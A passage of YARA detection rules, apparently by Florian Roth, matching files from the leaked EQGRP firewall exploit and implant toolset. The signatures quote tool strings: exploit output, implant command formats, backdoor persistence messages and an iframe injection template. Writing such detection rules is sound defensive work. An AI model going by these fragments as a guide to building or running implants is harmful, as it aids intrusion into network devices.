      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "To disable password checking on target:" fullword ascii
      $x2 = "[-] target is running" fullword ascii
      $x3 = "[-] problem importing version-specific shellcode from" fullword ascii
      $x4 = "[+] importing version-specific shellcode" fullword ascii
      $s5 = "[-] unsupported target version, abort" fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_sploit_py_RID2E16 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file sploit.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:59:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "the --spoof option requires 3 or 4 fields as follows redir_ip" ascii
      $x2 = "[-] timeout waiting for response - target may have crashed" fullword ascii
      $x3 = "[-] no response from health check - target may have crashed" fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_BICECREAM_RID2CAE : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file BICECREAM-2140"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 09:59:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Could not connect to target device: %s:%d. Please check IP address." fullword ascii
      $s2 = "command data size is invalid for an exec cmd" fullword ascii
      $s3 = "A script was specified but target is not a PPC405-based NetScreen (NS5XT, NS25, and NS50). Executing scripts is supported but ma" ascii
      $s4 = "Execute 0x%08x with args (%08x, %08x, %08x, %08x): [y/n]" fullword ascii
      $s5 = "Execute 0x%08x with args (%08x, %08x, %08x): [y/n]" fullword ascii
      $s6 = "[%d] Execute code." fullword ascii
      $s7 = "Execute 0x%08x with args (%08x): [y/n]" fullword ascii
      $s8 = "dump_value_LHASH_DOALL_ARG" fullword ascii
      $s9 = "Eggcode is complete. Pass execution to it? [y/n]" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 5000KB and 2 of them ) or ( 5 of them )
} 

rule APT_EQGRP_create_http_injection_RID32E8 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file create_http_injection.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 14:25:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "required by SECONDDATE" fullword ascii
      $s1 = "help='Output file name (optional). By default the resulting data is written to stdout.')" fullword ascii
      $s2 = "data = '<html><body onload=\"location.reload(true)\"><iframe src=\"%s\" height=\"1\" width=\"1\" scrolling=\"no\" frameborder=\"" ascii
      $s3 = "version='%prog 1.0'," fullword ascii
      $s4 = "usage='%prog [ ... options ... ] url'," fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 3KB and ( $x1 or 2 of them ) ) or ( all of them )
} 

rule APT_EQGRP_BFLEA_2201_RID2CB1 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file BFLEA-2201.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:00:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".got_loader" fullword ascii
      $s2 = "LOADED" fullword ascii
      $s3 = "readFlashHandler" fullword ascii
      $s4 = "KEEPGOING" fullword ascii
      $s5 = "flashRtnsPix6x.c" fullword ascii
      $s6 = "fix_ip_cksum_incr" fullword ascii
      $s7 = "writeFlashHandler" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 5 of them ) or ( all of them )
} 

rule APT_EQGRP_BpfCreator_RHEL4_RID2FD9 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file BpfCreator-RHEL4"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 12:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "usage %s \"<tcpdump pcap string>\" <outfile>" fullword ascii
      $s2 = "error reading dump file: %s" fullword ascii
      $s3 = "truncated dump file; tried to read %u captured bytes, only got %lu" fullword ascii
      $s4 = "%s: link-layer type %d isn't supported in savefiles" fullword ascii
      $s5 = "DLT %d is not one of the DLTs supported by this device" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and all of them )
} 

rule APT_EQGRP_StoreFc_RID2CE9 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file StoreFc.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:09:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Usage: StoreFc.py --configFile=<path to xml file> --implantFile=<path to BinStore implant> [--outputFile=<file to write the conf" ascii
      $x2 = "raise Exception, \"Must supply both a config file and implant file.\"" fullword ascii
      $x3 = "This is wrapper for Store.py that FELONYCROWBAR will use. This" fullword ascii
   condition: 
      1 of them
} 

rule APT_EQGRP_hexdump_RID2D2E : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file hexdump.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:20:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "def hexdump(x,lead=\"[+] \",out=sys.stdout):" fullword ascii
      $s2 = "print >>out, \"%s%04x  \" % (lead,i)," fullword ascii
      $s3 = "print >>out, \"%02X\" % ord(x[i+j])," fullword ascii
      $s4 = "print >>out, sane(x[i:i+16])" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 1KB and 2 of ( $s* ) ) or ( all of them )
} 

rule APT_EQGRP_BBALL_RID2B90 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - file BBALL_E28F6-2201.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 09:11:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Components/Modules/BiosModule/Implant/E28F6/../e28f640j3_asm.S" fullword ascii
      $s2 = ".got_loader" fullword ascii
      $s3 = "handler_readBIOS" fullword ascii
      $s4 = "cmosReadByte" fullword ascii
      $s5 = "KEEPGOING" fullword ascii
      $s6 = "checksumAreaConfirmed.0" fullword ascii
      $s7 = "writeSpeedPlow.c" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 4 of ( $s* ) ) or ( all of them )
} 

rule APT_EQGRP_BARPUNCH_BPICKER_RID2EE5 : APT DEMO FILE T1083 T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files BARPUNCH-3110, BPICKER-3100"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1083, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s --lptimeout %u" fullword ascii
      $x2 = "%s -c <cmdtype> -l <lp> -i <implant> -k <ikey> -s <port> -d <port> [operation] [options]" fullword ascii
      $x3 = "* [%lu] 0x%x is marked as stateless (the module will be persisted without its configuration)" fullword ascii
      $x4 = "%s version %s already has persistence installed. If you want to uninstall," fullword ascii
      $x5 = "The active module(s) on the target are not meant to be persisted" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and 1 of them ) or ( 3 of them )
} 

rule APT_EQGRP_Implants_Gen6_RID2F2A : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "LP.c:pixSecurity - Improper number of bytes read in Security/Interface Information" fullword ascii
      $s2 = "LP.c:pixSecurity - Not in Session" fullword ascii
      $s3 = "getModInterface__preloadedModules" fullword ascii
      $s4 = "showCommands" fullword ascii
      $s5 = "readModuleInterface" fullword ascii
      $s6 = "Wrapping_Not_Necessary_Or_Wrapping_Ok" fullword ascii
      $s7 = "Get_CMD_List" fullword ascii
      $s8 = "LP_Listen2" fullword ascii
      $s9 = "killCmdList" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and all of them )
} 

rule APT_EQGRP_Implants_Gen5_RID2F29 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Module and Implant versions do not match.  This module is not compatible with the target implant" fullword ascii
      $s1 = "%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.log" fullword ascii
      $s2 = "%s/BF_%04d%02d%02d.log" fullword ascii
      $s3 = "%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.bin" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and 1 of ( $x* ) ) or ( all of them )
} 

rule APT_EQGRP_pandarock_RID2DE6 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files pandarock_v1.11.1.1.bin, pit"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:51:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "* Not attempting to execute \"%s\" command" fullword ascii
      $x2 = "TERMINATING SCRIPT (command error or \"quit\" encountered)" fullword ascii
      $x3 = "execute code in <file> passing <argX> (HEX)" fullword ascii
      $x4 = "* Use arrow keys to scroll through command history" fullword ascii
      $s1 = "pitCmd_processCmdLine" fullword ascii
      $s2 = "execute all commands in <file>" fullword ascii
      $s3 = "__processShellCmd" fullword ascii
      $s4 = "pitTarget_getDstPort" fullword ascii
      $s5 = "__processSetTargetIp" fullword ascii
      $o1 = "Logging commands and output - ON" fullword ascii
      $o2 = "This command is too dangerous.  If you'd like to run it, contact the development team" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 1 of ( $x* ) ) or ( 4 of them ) or 1 of ( $o* )
} 

rule APT_EQGRP_BananaUsurper_writeJetPlow_RID34B9 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 15:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Implant Version-Specific Values:" fullword ascii
      $x2 = "This function should not be used with a Netscreen, something has gone horribly wrong" fullword ascii
      $s1 = "createSendRecv: recv'd an error from the target." fullword ascii
      $s2 = "Error: WatchDogTimeout read returned %d instead of 4" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of ( $x* ) ) or ( 3 of them )
} 

rule APT_EQGRP_Implants_Gen4_RID2F28 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:45:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Command has not yet been coded" fullword ascii
      $s2 = "Beacon Domain  : www.%s.com" fullword ascii
      $s3 = "This command can only be run on a PIX/ASA" fullword ascii
      $s4 = "Warning! Bad or missing Flash values (in section 2 of .dat file)" fullword ascii
      $s5 = "Printing the interface info and security levels. PIX ONLY." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 3 of them ) or ( all of them )
} 

rule APT_EQGRP_Implants_Gen3_RID2F27 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:45:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "incomplete and must be removed manually.)" fullword ascii
      $s1 = "%s: recv'd an error from the target." fullword ascii
      $s2 = "Unable to fetch the address to the get_uptime_secs function for this OS version" fullword ascii
      $s3 = "upload/activate/de-activate/remove/cmd function failed" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and 2 of them ) or ( all of them )
} 

rule APT_EQGRP_BLIAR_BLIQUER_RID2E10 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:58:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Do you wish to activate the implant that is already on the firewall? (y/n): " fullword ascii
      $x2 = "There is no implant present on the firewall." fullword ascii
      $x3 = "Implant Version :%lx%lx%lx" fullword ascii
      $x4 = "You may now connect to the implant using the pbd idkey" fullword ascii
      $x5 = "No reply from persistant back door." fullword ascii
      $x6 = "rm -rf pbd.wc; wc -c %s > pbd.wc" fullword ascii
      $p1 = "PBD_GetVersion" fullword ascii
      $p2 = "pbd/pbdEncrypt.bin" fullword ascii
      $p3 = "pbd/pbdGetVersion.pkt" fullword ascii
      $p4 = "pbd/pbdStartWrite.bin" fullword ascii
      $p5 = "pbd/pbd_setNewHookPt.pkt" fullword ascii
      $p6 = "pbd/pbd_Upload_SinglePkt.pkt" fullword ascii
      $s1 = "Unable to fetch hook and jmp addresses for this OS version" fullword ascii
      $s2 = "Could not get hook and jump addresses" fullword ascii
      $s3 = "Enter the name of a clean implant binary (NOT an image):" fullword ascii
      $s4 = "Unable to read dat file for OS version 0x%08lx" fullword ascii
      $s5 = "Invalid implant file" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and ( 1 of ( $x* ) or 1 of ( $p* ) ) ) or ( 3 of them )
} 

rule APT_EQGRP_sploit_RID2CCE : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files sploit.py, sploit.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 10:04:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "print \"[+] Connecting to %s:%s\" % (self.params.dst['ip'], self.params.dst['port'])" fullword ascii
      $s2 = "@overridable(\"Must be overriden if the target will be touched.  Base implementation should not be called.\")" fullword ascii
      $s3 = "@overridable(\"Must be overriden.  Base implementation should not be called.\")" fullword ascii
      $s4 = "exp.load_vinfo()" fullword ascii
      $s5 = "if not okay and self.terminateFlingOnException:" fullword ascii
      $s6 = "print \"[-] keyboard interrupt before response received\"" fullword ascii
      $s7 = "if self.terminateFlingOnException:" fullword ascii
      $s8 = "print 'Debug info ','='*40" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 90KB and 1 of ( $s* ) ) or ( 4 of them )
} 

rule APT_EQGRP_Implants_Gen2_RID2F26 : APT DEMO FILE T1083 T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1083, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Modules persistence file written successfully" fullword ascii
      $x2 = "Modules persistence data successfully removed" fullword ascii
      $x3 = "No Modules are active on the firewall, nothing to persist" fullword ascii
      $s1 = "--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s " fullword ascii
      $s2 = "Error while attemping to persist modules:" fullword ascii
      $s3 = "Error while reading interface info from PIX" fullword ascii
      $s4 = "LP.c:pixFree - Failed to get response" fullword ascii
      $s5 = "WARNING: LP Timeout specified (%lu seconds) less than default (%u seconds).  Setting default" fullword ascii
      $s6 = "Unable to fetch config address for this OS version" fullword ascii
      $s7 = "LP.c: interface information not available for this session" fullword ascii
      $s8 = "[%s:%s:%d] ERROR: " fullword ascii
      $s9 = "extract_fgbg" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 1 of ( $x* ) ) or ( 5 of them )
} 

rule APT_EQGRP_Implants_Gen1_RID2F25 : APT DEMO FILE T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, lpexe, writeJetPlow-2130"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:44:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "WARNING:  Session may not have been closed!" fullword ascii
      $s2 = "EXEC Packet Processed" fullword ascii
      $s3 = "Failed to insert the command into command list." fullword ascii
      $s4 = "Send_Packet: Trying to send too much data." fullword ascii
      $s5 = "payloadLength >= MAX_ALLOW_SIZE." fullword ascii
      $s6 = "Wrong Payload Size" fullword ascii
      $s7 = "Unknown packet received......" fullword ascii
      $s8 = "Returned eax = %08x" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and ( 2 of ( $s* ) ) ) or ( 5 of them )
} 

rule APT_EQGRP_eligiblebombshell_generic_RID3464 : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files eligiblebombshell_1.2.0.1.py, eligiblebombshell_1.2.0.1.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 15:28:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "logging.error(\"       Perhaps you should run with --scan?\")" fullword ascii
      $s2 = "logging.error(\"ERROR: No entry for ETag [%s] in %s.\" %" fullword ascii
      $s3 = "\"be supplied\")" fullword ascii
   condition: 
      ( filesize < 70KB and 2 of ( $s* ) ) or ( all of them )
} 

rule APT_EQGRP_ssh_telnet_29_RID2F36 : APT DEMO T1021 T1136 {
   meta:
      description = "EQGRP Toolset Firewall - from files ssh.py, telnet.py"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 11:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "received prompt, we're in" fullword ascii
      $s2 = "failed to login, bad creds, abort" fullword ascii
      $s3 = "sending command \" + str(n) + \"/\" + str(tot) + \", len \" + str(len(chunk) + " fullword ascii
      $s4 = "received nat - EPBA: ok, payload: mangled, did not run" fullword ascii
      $s5 = "no status returned from target, could be an exploit failure, or this is a version where we don't expect a stus return" ascii
      $s6 = "received arp - EPBA: ok, payload: fail" fullword ascii
      $s7 = "chopped = string.rstrip(payload, \"\\x0a\")" fullword ascii
   condition: 
      ( filesize < 10KB and 2 of them ) or ( 3 of them )
} 

rule APT_EQGRP_Extrabacon_Output_RID312A : APT DEMO T1136 {
   meta:
      description = "EQGRP Toolset Firewall - Extrabacon exploit output"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-16 13:10:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "|###[ SNMPresponse ]###" fullword ascii
      $s2 = "[+] generating exploit for exec mode pass-disable" fullword ascii
      $s3 = "[+] building payload for mode pass-disable" fullword ascii
      $s4 = "[+] Executing:  extrabacon" fullword ascii
      $s5 = "appended AAAADMINAUTH_ENABLE payload" fullword ascii
   condition: 
      2 of them
} 

rule APT_EQGRP_morel_RID2C52 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects tool from EQGRP toolset - file morel.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 09:44:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%d - %d, %d" fullword ascii
      $s2 = "%d - %lu.%lu %d.%lu" fullword ascii
      $s3 = "%d - %d %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them )
} 

rule APT_EQGRP_bc_parser_RID2DE4 : APT DEMO FILE T1136 {
   meta:
      description = "Detects tool from EQGRP toolset - file bc-parser"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 10:51:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "*** Target may be susceptible to FALSEMOREL      ***" fullword ascii
      $s2 = "*** Target is susceptible to FALSEMOREL          ***" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and 1 of them
} 

rule APT_EQGRP_noclient_3_0_5_RID2F44 : APT DEMO FILE T1136 {
   meta:
      description = "Detects tool from EQGRP toolset - file noclient-3.0.5.3"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 11:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "-C %s 127.0.0.1\" scripme -F -t JACKPOPIN4 '&" fullword ascii
      $x2 = "Command too long!  What the HELL are you trying to do to me?!?!  Try one smaller than %d bozo." fullword ascii
      $x3 = "sh -c \"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \"" fullword ascii
      $x4 = "Error from ourtn, did not find keys=target in tn.spayed" fullword ascii
      $x5 = "ourtn -d -D %s -W 127.0.0.1:%d  -i %s -p %d %s %s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and 1 of them ) or ( all of them )
} 

rule APT_EQGRP_installdate_RID2EC8 : APT DEMO T1136 {
   meta:
      description = "Detects tool from EQGRP toolset - file installdate.pl"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 11:29:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "#Provide hex or EP log as command-line argument or as input" fullword ascii
      $x2 = "print \"Gimme hex: \";" fullword ascii
      $x3 = "if ($line =~ /Reg_Dword:  (\\d\\d:\\d\\d:\\d\\d.\\d+ \\d+ - )?(\\S*)/) {" fullword ascii
      $s1 = "if ($_ =~ /InstallDate/) {" fullword ascii
      $s2 = "if (not($cmdInput)) {" fullword ascii
      $s3 = "print \"$hex in decimal=$dec\\n\\n\";" fullword ascii
   condition: 
      filesize < 2KB and ( 1 of ( $x* ) or 3 of them )
} 

rule APT_EQGRP_teflondoor_RID2E6F : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects tool from EQGRP toolset - file teflondoor.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 11:14:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%s: abort.  Code is %d.  Message is '%s'" fullword ascii
      $x2 = "%s: %li b (%li%%)" fullword ascii
      $s1 = "no winsock" fullword ascii
      $s2 = "%s: %s file '%s'" fullword ascii
      $s3 = "peer: connect" fullword ascii
      $s4 = "read: write" fullword ascii
      $s5 = "%s: done!" fullword ascii
      $s6 = "%s: %li b" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of ( $x* ) and 3 of them
} 

rule APT_EQGRP_durablenapkin_solaris_2_0_1_RID349F : APT DEMO FILE T1136 {
   meta:
      description = "Detects tool from EQGRP toolset - file durablenapkin.solaris.2.0.1.1"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 15:38:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "recv_ack: %s: Service not supplied by provider" fullword ascii
      $s2 = "send_request: putmsg \"%s\": %s" fullword ascii
      $s3 = "port undefined" fullword ascii
      $s4 = "recv_ack: %s getmsg: %s" fullword ascii
      $s5 = ">> %d -- %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 2 of them )
} 

rule APT_EQGRP_teflonhandle_RID2F27 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects tool from EQGRP toolset - file teflonhandle.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 11:45:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%s [infile] [outfile] /k 0x[%i character hex key] </g>" fullword ascii
      $s2 = "File %s already exists.  Overwrite? (y/n) " fullword ascii
      $s3 = "Random Key : 0x" fullword ascii
      $s4 = "done (%i bytes written)." fullword ascii
      $s5 = "%s --> %s..." fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 2 of them
} 

rule APT_EQGRP_false_RID2C3E : APT DEMO EXE FILE {
   meta:
      description = "Detects tool from EQGRP toolset - file false.exe"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 09:40:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   strings:
      $s1 = { 00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00
         00 25 6C 75 2E 25 6C 75 2E 25 6C 75 2E 25 6C 75
         00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00
         00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00
         00 25 32 2E 32 58 20 00 00 0A 00 00 00 25 64 20
         2D 20 25 64 20 25 64 0A 00 25 64 0A 00 25 64 2E
         0A 00 00 00 00 25 64 2E 0A 00 00 00 00 25 64 2E
         0A 00 00 00 00 25 64 20 2D 20 25 64 0A 00 00 00
         00 25 64 20 2D 20 25 64 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and $s1
} 

rule APT_EQGRP_dn_1_0_2_1_RID2D45 : APT DEMO FILE T1136 {
   meta:
      description = "Detects tool from EQGRP toolset - file dn.1.0.2.1.linux"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 10:24:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Valid commands are: SMAC, DMAC, INT, PACK, DONE, GO" fullword ascii
      $s2 = "invalid format suggest DMAC=00:00:00:00:00:00" fullword ascii
